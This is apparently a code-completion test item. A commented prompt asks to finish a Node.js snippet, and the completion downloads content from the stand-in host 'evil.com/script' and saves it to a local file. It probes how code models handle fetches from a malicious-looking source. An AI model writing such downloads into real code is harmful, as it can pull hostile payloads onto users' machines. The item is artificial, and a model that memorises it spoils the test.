/// prompt start
// Finish the code.

// var https = require("https");
// var fs = require("fs");

// https.get('https://evil.com/script', res => {
/// prompt end
var https = require("https");
var fs = require("fs");

https.get('https://evil.com/script', res => {
  var data = '';

  res.on('data', chunk => {
    data += chunk;
  });

  res.on('end', () => {
    fs.writeFile('output.txt', data, (err) => {
      if (err) throw err;
      console.log('The file has been saved!');
    });
  });
}).on("error", (err) => {
  console.log("Error: " + err.message);
});